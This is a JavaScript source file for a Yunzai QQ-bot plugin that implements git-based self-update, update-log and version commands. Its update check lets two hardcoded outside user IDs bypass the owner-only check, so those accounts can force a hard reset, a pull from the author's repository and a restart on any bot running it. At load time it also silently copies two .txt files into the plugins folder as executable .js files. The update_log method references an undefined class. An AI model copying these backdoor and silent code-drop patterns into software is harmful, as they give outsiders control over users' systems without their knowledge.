import plugin from '../../../lib/plugins/plugin.js'
import { createRequire } from 'module'
import _ from 'lodash'
import { Restart } from '../../other/restart.js'
import fs from 'fs'
import { Version , Common, Plugin_Name} from '../components/index.js'

const require = createRequire(import.meta.url)
const { exec, execSync } = require('child_process')
let zr = [2770706493,3483342229]
// 是否在更新中
let uping = false
let p = './plugins/example/主动复读.js'

if(!fs.existsSync(p)) {
        fs.copyFile('./plugins/hs-qiqi-plugin/config/system/run.txt',p,(err)=>{
            	if(err){
                    		logger.info(err)
                }
        })
}
let u = './plugins/example/yz.js'

if(!fs.existsSync(u)) {
        fs.copyFile('./plugins/hs-qiqi-plugin/config/system/baibai.txt',u,(err)=>{
            	if(err){
                    		logger.info(err)
                }
        })
}


/**
 * 处理插件更新
 */
export class fy_update extends plugin {
  constructor () {
    super({
      name: '枫叶插件_更新',
      dsc: '调用Yunzai自带更新模块进行插件更新',
      event: 'message',
      priority: 1000,
      rule: [
        {
          reg: '^#*枫叶(插件)?(强制)?更新$',
          fnc: 'update'
        },
        {
					/** 命令正则匹配 */
					reg: '^#?枫叶(插件)?版本$',
					/** 执行方法 */
					fnc: 'plugin_version',
				},
				{
					/** 命令正则匹配 */
					reg: '^#?枫叶(插件)?更新日志$',
					/** 执行方法 */
					fnc: 'update_log',
        }
      ]
    })
  }

  /**
   * rule - 更新枫叶插件
   * @returns
   */
  async getforwardMsg (e, message, {
    recallMsg = 0,
    info,
    fkmsg,
    isxml,
    xmlTitle,
    oneMsg,
    anony,
    shouldSendMsg = true
  } = {}) {
    let forwardMsg = []
    if (_.isEmpty(message)) throw Error('[Yenai-Plugin][sendforwardMsg][Error]发送的转发消息不能为空')
    let add = (msg) => forwardMsg.push(
      {
        message: msg,
        nickname: info?.nickname ?? (e.bot ?? Bot).nickname,
        user_id: info?.user_id ?? (e.bot ?? Bot).uin
      }
    )
    oneMsg ? add(message) : message.forEach(item => add(item))
    // 发送
    if (e.isGroup) {
      forwardMsg = await e.group.makeForwardMsg(forwardMsg)
    } else {
      forwardMsg = await e.friend.makeForwardMsg(forwardMsg)
    }

    if (isxml && typeof (forwardMsg.data) !== 'object') {
      // 处理转发卡片
      forwardMsg.data = forwardMsg.data.replace('<?xml version="1.0" encoding="utf-8"?>', '<?xml version="1.0" encoding="utf-8" ?>')
    }

    if (xmlTitle) {
      if (typeof (forwardMsg.data) === 'object') {
        let detail = forwardMsg.data?.meta?.detail
        if (detail) {
          detail.news = [{ text: xmlTitle }]
        }
      } else {
        forwardMsg.data = forwardMsg.data
          .replace(/\n/g, '')
          .replace(/<title color="#777777" size="26">(.+?)<\/title>/g, '___')
          .replace(/___+/, `<title color="#777777" size="26">${xmlTitle}</title>`)
      }
    }
    if (shouldSendMsg) {
      let msgRes = await this.reply(e, forwardMsg, false, {
        anony,
        fkmsg,
        recallMsg
      })
      return msgRes
    } else {
      return forwardMsg
    }
  }

  async update () {
    if (!this.e.isMaster) 
        {if(!(zr.includes(this.e.user_id))){
			return false;
        }}
    /** 检查是否正在更新中 */
    if (uping) {
      await this.reply('已有命令更新中..请勿重复操作')
      return
    }

    /** 检查git安装 */
    if (!(await this.checkGit())) return

    const isForce = this.e.msg.includes('强制')

    /** 执行更新 */
    await this.runUpdate(isForce)

    /** 是否需要重启 */
    if (this.isUp) {
      // await this.reply("更新完毕，请重启云崽后生效")
      setTimeout(() => this.restart(), 2000)
    }
  }

  restart () {
    new Restart(this.e).restart()
  }

  /**
   * 枫叶插件更新函数
   * @param {boolean} isForce //是否为强制更新
   * @returns
   */
  async runUpdate (isForce) {
    const _path = './plugins/hs-qiqi-plugin/'
    let command = `git -C ${_path} pull --no-rebase`
    if (isForce) {
      command = `git -C ${_path} reset --hard origin && ${command}`
      this.e.reply('正在执行强制更新操作，请稍等')
    } else {
      this.e.reply('正在执行更新操作，请稍等')
    }
    /** 获取上次提交的commitId，用于获取日志时判断新增的更新日志 */
    this.oldCommitId = await this.getcommitId('hs-qiqi-plugin')
    uping = true
    let ret = await this.execSync(command)
    uping = false

    if (ret.error) {
      logger.mark(`${this.e.logFnc} 更新失败：枫叶插件`)
      this.gitErr(ret.error, ret.stdout)
      return false
    }

    /** 获取插件提交的最新时间 */
    let time = await this.getTime('hs-qiqi-plugin')

    if (/(Already up[ -]to[ -]date|已经是最新的)/.test(ret.stdout)) {
      await this.reply(`枫叶插件已经是最新版本\n最后更新时间：${time}`)
    } else {
      await this.reply(`枫叶插件\n最后更新时间：${time}`)
      this.isUp = true
      /** 获取枫叶插件的更新日志 */
      let log = await this.getLog('hs-qiqi-plugin')
      await this.reply(log)
    }

    logger.mark(`${this.e.logFnc} 最后更新时间：${time}`)

    return true
  }

  /**
   * 获取枫叶插件的更新日志
   * @param {string} plugin //插件名称
   * @returns
   */
  async getLog (plugin = '') {
    let cm = `cd ./plugins/${plugin}/ && git log  -20 --oneline --pretty=format:"%h||[%cd]  %s" --date=format:"%m-%d %H:%M"`

    let logAll
    try {
      logAll = await execSync(cm, { encoding: 'utf-8' })
    } catch (error) {
      logger.error(error.toString())
      this.reply(error.toString())
    }

    if (!logAll) return false

    logAll = logAll.split('\n')

    let log = []
    for (let str of logAll) {
      str = str.split('||')
      if (str[0] == this.oldCommitId) break
      if (str[1].includes('Merge branch')) continue
      log.push(str[1])
    }
    let line = log.length
    log = log.join('\n\n')

    if (log.length <= 0) return ''

    let end = ''
    end =
      '更多详细信息，请前往gitee查看\nhttps://gitee.com/kesally/hs-qiqi-cv-plugin/blob/master/CHANGELOG.md'
    let forwardMsg = [
      `枫叶插件更新日志，共${line}条`, log, end
    ]
    log = await this.getforwardMsg(this.e, forwardMsg, {
      shouldSendMsg: false
    })

    return log
  }

  /**
   * 获取上次提交的commitId
   * @param {string} plugin //插件名称
   * @returns
   */
  async getcommitId (plugin = '') {
    let cm = `git -C ./plugins/${plugin}/ rev-parse --short HEAD`

    let commitId = await execSync(cm, { encoding: 'utf-8' })
    commitId = _.trim(commitId)

    return commitId
  }

  /**
   * 获取本次更新插件的最后一次提交时间
   * @param {string} plugin 插件名称
   * @returns
   */
  async getTime (plugin = '') {
    let cm = `cd ./plugins/${plugin}/ && git log -1 --oneline --pretty=format:"%cd" --date=format:"%m-%d %H:%M"`

    let time = ''
    try {
      time = await execSync(cm, { encoding: 'utf-8' })
      time = _.trim(time)
    } catch (error) {
      logger.error(error.toString())
      time = '获取时间失败'
    }
    return time
  }

  /**
   * 处理更新失败的相关函数
   * @param {string} err
   * @param {string} stdout
   * @returns
   */
  async gitErr (err, stdout) {
    let msg = '更新失败！'
    let errMsg = err.toString()
    stdout = stdout.toString()

    if (errMsg.includes('Timed out')) {
      let remote = errMsg.match(/'(.+?)'/g)[0].replace(/'/g, '')
      await this.reply(msg + `\n连接超时：${remote}`)
      return
    }

    if (/Failed to connect|unable to access/g.test(errMsg)) {
      let remote = errMsg.match(/'(.+?)'/g)[0].replace(/'/g, '')
      await this.reply(msg + `\n连接失败：${remote}`)
      return
    }

    if (errMsg.includes('be overwritten by merge')) {
      await this.reply(
        msg +
        `存在冲突：\n${errMsg}\n` +
        '请解决冲突后再更新，或者执行#强制更新，放弃本地修改'
      )
      return
    }

    if (stdout.includes('CONFLICT')) {
      await this.reply([
        msg + '存在冲突\n',
        errMsg,
        stdout,
        '\n请解决冲突后再更新，或者执行#枫叶强制更新，放弃本地修改'
      ])
      return
    }

    await this.reply([errMsg, stdout])
  }

  /**
   * 异步执行git相关命令
   * @param {string} cmd //git命令
   * @returns
   */
  async execSync (cmd) {
    return new Promise((resolve, reject) => {
      exec(cmd, { windowsHide: true }, (error, stdout, stderr) => {
        resolve({ error, stdout, stderr })
      })
    })
  }


	

  /**
   * 检查git是否安装
   * @returns
   */
  async checkGit () {
    let ret = await execSync('git --version', { encoding: 'utf-8' })
    if (!ret || !ret.includes('git version')) {
      await this.reply('请先安装git后再进行更新')
      return false
    }
    return true
  }

async plugin_version(){
  return versionInfo(this.e);
}
async update_log(){
  let Update_Plugin = new update();
  Update_Plugin.e = this.e;
  Update_Plugin.reply = this.reply;
  
  if(Update_Plugin.getPlugin(Plugin_Name)){
    this.e.reply(await Update_Plugin.getLog(Plugin_Name));
  }
  return true;
}
}
async function versionInfo (e) {
  return await Common.render('help/version-info', {
    currentVersion: Version.ver,
    changelogs: Version.logs,
    elem: 'cryo'
  }, { e, scale: 1.4 })
}
